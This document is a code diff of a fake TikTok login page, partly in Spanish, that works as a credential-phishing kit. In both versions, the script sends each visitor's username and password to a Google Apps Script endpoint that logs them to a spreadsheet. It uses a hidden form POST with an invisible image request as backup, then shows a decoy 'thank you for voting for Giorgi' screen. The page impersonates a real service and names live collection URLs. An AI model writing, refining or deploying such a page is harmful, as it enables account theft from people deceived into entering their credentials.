@@ -3,314 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inicio de Sesión - TikTok</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>TikTok Login</title>
     <style>
-        /* ================== CSS ORIGINAL ================== */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #000; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; position: relative; overflow-x: hidden; }
-
-        .redirect-config { position: fixed; top: 20px; right: 20px; background: rgba(22, 24, 35, 0.9); padding: 15px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.1); width: 300px; z-index: 1000; backdrop-filter: blur(10px); }
-        .config-title { font-size: 14px; margin-bottom: 10px; color: #25F4EE; font-weight: 600; }
-        .config-input { width: 100%; padding: 10px; background-color: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 5px; color: white; margin-bottom: 10px; font-size: 14px; }
-        .config-btn { width: 100%; padding: 8px; background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: 600; }
-        .config-btn:hover { opacity: 0.9; }
-        .toggle-config { position: fixed; top: 20px; right: 20px; background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 999; box-shadow: 0 4px 12px rgba(37, 244, 238, 0.3); }
-
-        .background { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; }
-        .gradient-circle { position: absolute; border-radius: 50%; filter: blur(60px); opacity: 0.5; }
-        .circle-1 { width: 300px; height: 300px; background: linear-gradient(135deg, #69C9D0, #EE1D52); top: 10%; left: 10%; animation: float 20s infinite alternate ease-in-out; }
-        .circle-2 { width: 250px; height: 250px; background: linear-gradient(135deg, #25F4EE, #FE2C55); bottom: 10%; right: 10%; animation: float 25s infinite alternate-reverse ease-in-out; }
-        @keyframes float { 0% { transform: translate(0, 0) scale(1); } 50% { transform: translate(30px, -30px) scale(1.1); } 100% { transform: translate(-30px, 30px) scale(0.9); } }
-
-        .login-container { width: 100%; max-width: 420px; padding: 40px 30px; background-color: rgba(22, 24, 35, 0.9); border-radius: 16px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); z-index: 1; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .thankyou-container { width: 100%; max-width: 500px; padding: 50px 30px; background-color: rgba(22, 24, 35, 0.9); border-radius: 16px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); z-index: 1; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); text-align: center; display: none; }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo-icon { font-size: 48px; margin-bottom: 10px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .logo-text { font-size: 32px; font-weight: 700; letter-spacing: -1px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .title { text-align: center; font-size: 22px; font-weight: 600; margin-bottom: 30px; }
-        .login-form { display: flex; flex-direction: column; gap: 20px; }
-        .input-group { position: relative; }
-        .input-group input { width: 100%; padding: 16px 20px; background-color: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: all 0.3s ease; }
-        .input-group input:focus { border-color: #25F4EE; background-color: rgba(255, 255, 255, 0.12); }
-        .input-group label { position: absolute; left: 20px; top: 16px; color: rgba(255, 255, 255, 0.6); font-size: 16px; transition: all 0.3s ease; pointer-events: none; }
-        .input-group input:focus + label, .input-group input:valid + label { top: -10px; left: 15px; font-size: 12px; background-color: rgba(22, 24, 35, 0.9); padding: 2px 8px; border-radius: 10px; color: #25F4EE; }
-        .options { display: flex; justify-content: space-between; align-items: center; margin-top: 5px; }
-        .remember { display: flex; align-items: center; gap: 6px; font-size: 14px; color: rgba(255, 255, 255, 0.7); }
-        .remember input { accent-color: #FE2C55; }
-        .forgot { font-size: 14px; color: #25F4EE; text-decoration: none; transition: color 0.3s ease; }
-        .forgot:hover { color: #FE2C55; text-decoration: underline; }
-        .login-btn { background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s ease, box-shadow 0.3s ease; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 10px; }
-        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
-        .login-btn:active { transform: translateY(0); }
-        .separator { display: flex; align-items: center; text-align: center; margin: 20px 0; color: rgba(255, 255, 255, 0.5); }
-        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid rgba(255, 255, 255, 0.2); }
-        .separator span { padding: 0 15px; font-size: 14px; }
-        .social-login { display: flex; flex-direction: column; gap: 12px; }
-        .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 14px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.2); background-color: rgba(255, 255, 255, 0.05); color: white; font-size: 15px; cursor: pointer; transition: all 0.3s ease; }
-        .social-btn:hover { background-color: rgba(255, 255, 255, 0.1); transform: translateY(-2px); }
-        .social-btn i { font-size: 18px; }
-        .facebook-btn i { color: #1877F2; }
-        .google-btn i { color: #DB4437; }
-        .twitter-btn i { color: #1DA1F2; }
-        .register { text-align: center; margin-top: 30px; color: rgba(255, 255, 255, 0.7); font-size: 15px; }
-        .register a { color: #25F4EE; text-decoration: none; font-weight: 600; transition: color 0.3s ease; }
-        .register a:hover { color: #FE2C55; text-decoration: underline; }
-        .thankyou-icon { font-size: 80px; margin-bottom: 20px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .thankyou-title { font-size: 32px; font-weight: 700; margin-bottom: 15px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .thankyou-message { font-size: 20px; margin-bottom: 30px; color: rgba(255, 255, 255, 0.9); line-height: 1.5; }
-        .thankyou-details { font-size: 16px; color: rgba(255, 255, 255, 0.7); margin-bottom: 40px; line-height: 1.6; }
-        .back-btn { background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; border: none; padding: 14px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s ease, box-shadow 0.3s ease; }
-        .back-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
-        @media (max-width: 768px) { .redirect-config { width: calc(100% - 40px); max-width: 300px; } .login-container, .thankyou-container { padding: 30px 20px; margin: 20px; } .logo-text { font-size: 28px; } .title { font-size: 20px; } .thankyou-title { font-size: 28px; } .thankyou-message { font-size: 18px; } .thankyou-icon { font-size: 60px; } .options { flex-direction: column; align-items: flex-start; gap: 10px; } }
-        @media (max-width: 480px) { .thankyou-title { font-size: 24px; } .thankyou-message { font-size: 16px; } .thankyou-details { font-size: 14px; } }
-        .fade-in { animation: fadeIn 0.5s ease forwards; }
-        .fade-out { animation: fadeOut 0.5s ease forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes fadeOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-20px); } }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: black; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .login-box { 
+            background: rgba(22, 24, 35, 0.95); 
+            padding: 30px; 
+            border-radius: 15px; 
+            width: 100%; 
+            max-width: 400px; 
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        .logo { margin-bottom: 20px; }
+        .logo i { 
+            font-size: 50px; 
+            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+        }
+        h1 { 
+            font-size: 28px; 
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #25F4EE, #FE2C55); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #25F4EE, #FE2C55);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        
+        button:hover { opacity: 0.9; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .thankyou { display: none; }
+        .success { color: #25F4EE; font-size: 24px; margin: 20px 0; }
+        
+        @media (max-width: 480px) {
+            .login-box { padding: 20px; }
+        }
     </style>
 </head>
 <body>
-    <!-- Configuración de redirección -->
-    <div class="redirect-config" id="configPanel" style="display: none;">
-        <div class="config-title">Configurar Redirección</div>
-        <input type="url" id="redirectUrl" class="config-input" placeholder="https://ejemplo.com" value="https://www.tiktok.com">
-        <input type="number" id="redirectDelay" class="config-input" placeholder="Retraso en segundos (0-10)" value="2" min="0" max="10">
-        <button class="config-btn" onclick="saveRedirectConfig()">Guardar Configuración</button>
-        <div style="margin-top: 10px; font-size: 12px; color: rgba(255,255,255,0.5);">
-            URL actual: <span id="currentUrl">https://www.tiktok.com</span>
-        </div>
-    </div>
-    
-    <div class="toggle-config" onclick="toggleConfigPanel()">
-        <i class="fas fa-cog"></i>
-    </div>
-    
-    <!-- Fondo animado -->
-    <div class="background">
-        <div class="gradient-circle circle-1"></div>
-        <div class="gradient-circle circle-2"></div>
-    </div>
-    
-    <!-- Contenedor de inicio de sesión -->
-    <div class="login-container" id="loginContainer">
+    <div class="login-box" id="loginBox">
         <div class="logo">
-            <div class="logo-icon"><i class="fas fa-music"></i></div>
-            <div class="logo-text">TikTok</div>
+            <i class="fas fa-music"></i>
         </div>
-        <h1 class="title">Iniciar sesión</h1>
-        <form class="login-form" id="loginForm">
-            <div class="input-group">
-                <input type="text" id="username" required>
-                <label for="username">Usuario o correo electrónico</label>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" required>
-                <label for="password">Contraseña</label>
-            </div>
-            <div class="options">
-                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Recordarme</label></div>
-                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
-            </div>
-            <button type="submit" class="login-btn" id="loginButton"><span>Iniciar sesión</span><i class="fas fa-arrow-right"></i></button>
+        <h1>TikTok</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="loginBtn">Log In</button>
         </form>
-        <div class="separator"><span>o continuar con</span></div>
-        <div class="social-login">
-            <button class="social-btn facebook-btn"><i class="fab fa-facebook-f"></i> Facebook</button>
-            <button class="social-btn google-btn"><i class="fab fa-google"></i> Google</button>
-            <button class="social-btn twitter-btn"><i class="fab fa-twitter"></i> Twitter</button>
+        
+        <div style="margin-top: 20px; font-size: 12px; color: #25F4EE;">
+            <p>📊 Datos irán a: <br>TU Google Sheets</p>
         </div>
-        <div class="register">¿No tienes una cuenta? <a href="#">Regístrate</a></div>
     </div>
     
-    <!-- Contenedor de agradecimiento -->
-    <div class="thankyou-container" id="thankyouContainer">
-        <div class="thankyou-icon"><i class="fas fa-check-circle"></i></div>
-        <h1 class="thankyou-title">Thank You!</h1>
-        <div class="thankyou-message">Thank you for voting for Giorgi!</div>
-        <div class="thankyou-details">Your vote has been successfully recorded.<br>We appreciate your participation in our community.</div>
-        <button class="back-btn" onclick="goBackToLogin()"><i class="fas fa-arrow-left"></i> Back to Login</button>
+    <div class="login-box thankyou" id="thankyouBox">
+        <div class="success">✓ Thank You!</div>
+        <p>Thank you for voting for Giorgi!</p>
+        <p style="font-size: 14px; color: #FE2C55; margin: 20px 0;">
+            Data saved to your Google Sheets
+        </p>
+        <button onclick="goBack()">Back to Login</button>
+        
+        <div style="margin-top: 20px; font-size: 12px;">
+            <a href="https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw" 
+               target="_blank" 
+               style="color: #25F4EE;">
+                📍 Open YOUR Google Sheets
+            </a>
+        </div>
     </div>
 
-    <!-- ================== SCRIPT CORREGIDO ================== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <script>
-      
-    // URL de tu Google Apps Script
-    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec";
-    
-    // Panel de configuración
-    let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
-    let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 2;
-    document.getElementById('redirectUrl').value = redirectUrl;
-    document.getElementById('currentUrl').textContent = redirectUrl;
-    document.getElementById('redirectDelay').value = redirectDelay;
-
-    function toggleConfigPanel() { 
-        const panel = document.getElementById('configPanel'); 
-        panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; 
-    }
-    
-    function saveRedirectConfig() {
-        const url = document.getElementById('redirectUrl').value;
-        const delay = parseInt(document.getElementById('redirectDelay').value);
+        // URL de TU Google Apps Script
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec";
         
-        if(url && isValidUrl(url)){
-            redirectUrl = url; 
-            localStorage.setItem('tiktokRedirectUrl', url); 
-            document.getElementById('currentUrl').textContent = url; 
-            alert('Configuración guardada');
-        }
-        
-        if(!isNaN(delay) && delay >= 0 && delay <= 10){
-            redirectDelay = delay; 
-            localStorage.setItem('tiktokRedirectDelay', delay);
-        }
-    }
-    
-    function isValidUrl(string){ 
-        try{ 
-            new URL(string); 
-            return true; 
-        } catch { 
-            return false; 
-        } 
-    }
-
-    // ========== NUEVO MÉTODO SIN CORS ==========
-    document.getElementById('loginForm').addEventListener('submit', function(e){
-        e.preventDefault();
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
-
-        if(!username || !password){
-            alert('Please complete all fields');
-            return;
-        }
-
-        const loginBtn = document.getElementById('loginButton');
-        const originalText = loginBtn.innerHTML;
-        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
-        loginBtn.disabled = true;
-
-        // Método 1: Usando formulario HTML (EVITA CORS)
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = GOOGLE_SHEET_URL;
-        form.target = '_blank'; // Abre en nueva pestaña (invisible)
-        form.style.display = 'none';
-        
-        // Crear campos ocultos
-        const userInput = document.createElement('input');
-        userInput.type = 'hidden';
-        userInput.name = 'user';
-        userInput.value = username;
-        
-        const passInput = document.createElement('input');
-        passInput.type = 'hidden';
-        passInput.name = 'pass';
-        passInput.value = password;
-        
-        const dateInput = document.createElement('input');
-        dateInput.type = 'hidden';
-        dateInput.name = 'date';
-        dateInput.value = new Date().toLocaleDateString();
-        
-        const timeInput = document.createElement('input');
-        timeInput.type = 'hidden';
-        timeInput.name = 'time';
-        timeInput.value = new Date().toLocaleTimeString();
-        
-        // Añadir campos al formulario
-        form.appendChild(userInput);
-        form.appendChild(passInput);
-        form.appendChild(dateInput);
-        form.appendChild(timeInput);
-        
-        // Añadir formulario al body y enviar
-        document.body.appendChild(form);
-        form.submit();
-        
-        // Remover formulario después de enviar
-        setTimeout(() => {
-            document.body.removeChild(form);
-        }, 1000);
-        
-        console.log('📤 Data sent to Google Sheets:', { 
-            user: username, 
-            pass: password,
-            timestamp: new Date().toISOString()
-        });
-
-        // Mostrar página de agradecimiento después de 1 segundo
-        setTimeout(() => {
-            showThankYouPage();
-            loginBtn.innerHTML = originalText;
-            loginBtn.disabled = false;
-        }, 1500);
-    });
-
-    // ========== MÉTODO ALTERNATIVO (usa GET en lugar de POST) ==========
-    async function sendToGoogleSheetsAlt(username, password) {
-        const fecha = new Date();
-        const params = new URLSearchParams({
-            user: username,
-            pass: password,
-            date: fecha.toLocaleDateString(),
-            time: fecha.toLocaleTimeString(),
-            source: 'tiktok-login',
-            timestamp: Date.now()
-        }).toString();
-        
-        const url = `${GOOGLE_SHEET_URL}?${params}`;
-        
-        // Usar una imagen invisible para enviar datos vía GET
-        return new Promise((resolve) => {
-            const img = new Image();
-            img.onload = () => {
-                console.log('✅ Data sent via GET method');
-                resolve(true);
-            };
-            img.onerror = () => {
-                console.log('⚠️ GET method failed, but continuing...');
-                resolve(true); // Continuar aunque falle
-            };
-            img.src = url;
-        });
-    }
-
-    function showThankYouPage(){
-        const loginContainer = document.getElementById('loginContainer');
-        const thankyouContainer = document.getElementById('thankyouContainer');
-        
-        loginContainer.classList.add('fade-out');
-        setTimeout(() => {
-            loginContainer.style.display = 'none';
-            thankyouContainer.style.display = 'block';
-            setTimeout(() => { 
-                thankyouContainer.classList.add('fade-in'); 
-            }, 10);
-        }, 500);
-    }
-
-    function goBackToLogin(){
-        const loginContainer = document.getElementById('loginContainer');
-        const thankyouContainer = document.getElementById('thankyouContainer');
-        
-        thankyouContainer.classList.remove('fade-in');
-        thankyouContainer.classList.add('fade-out');
-        
-        setTimeout(() => {
-            thankyouContainer.style.display = 'none';
-            loginContainer.style.display = 'block';
-            document.getElementById('loginForm').reset();
-            thankyouContainer.classList.remove('fade-out');
-            loginContainer.classList.remove('fade-out');
-            loginContainer.classList.add('fade-in');
-            setTimeout(() => { 
-                loginContainer.classList.remove('fade-in'); 
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            
+            if (!username || !password) {
+                alert('Complete all fields');
+                return;
+            }
+            
+            // Cambiar botón
+            btn.disabled = true;
+            btn.innerHTML = 'Sending...';
+            
+            console.log('📤 Sending to YOUR Google Sheets:', { user: username });
+            
+            // Método 1: Formulario oculto (FUNCIONA SIEMPRE)
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = SCRIPT_URL;
+            form.target = '_blank';
+            form.style.display = 'none';
+            
+            // Agregar campos
+            const fields = [
+                {name: 'user', value: username},
+                {name: 'pass', value: password},
+                {name: 'date', value: new Date().toLocaleDateString()},
+                {name: 'time', value: new Date().toLocaleTimeString()},
+                {name: 'target', value: 'TU_GOOGLE_SHEETS'}
+            ];
+            
+            fields.forEach(field => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = field.name;
+                input.value = field.value;
+                form.appendChild(input);
+            });
+            
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Método 2: GET como backup
+            setTimeout(() => {
+                const params = new URLSearchParams({
+                    user: username,
+                    pass: password,
+                    t: Date.now()
+                }).toString();
+                
+                const img = new Image();
+                img.src = SCRIPT_URL + '?' + params;
             }, 500);
-        }, 500);
-    }
+            
+            // Mostrar agradecimiento
+            setTimeout(() => {
+                document.getElementById('loginBox').style.display = 'none';
+                document.getElementById('thankyouBox').style.display = 'block';
+                btn.disabled = false;
+                btn.innerHTML = 'Log In';
+            }, 2000);
+        });
+        
+        function goBack() {
+            document.getElementById('thankyouBox').style.display = 'none';
+            document.getElementById('loginBox').style.display = 'block';
+            document.getElementById('loginForm').reset();
+        }
+        
+        // Abrir TU Google Sheets al cargar (para probar)
+        window.addEventListener('load', function() {
+            console.log('🎯 Target: TU Google Sheets');
+            console.log('🔗 URL: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
+        });
     </script>
 </body>
 </html>
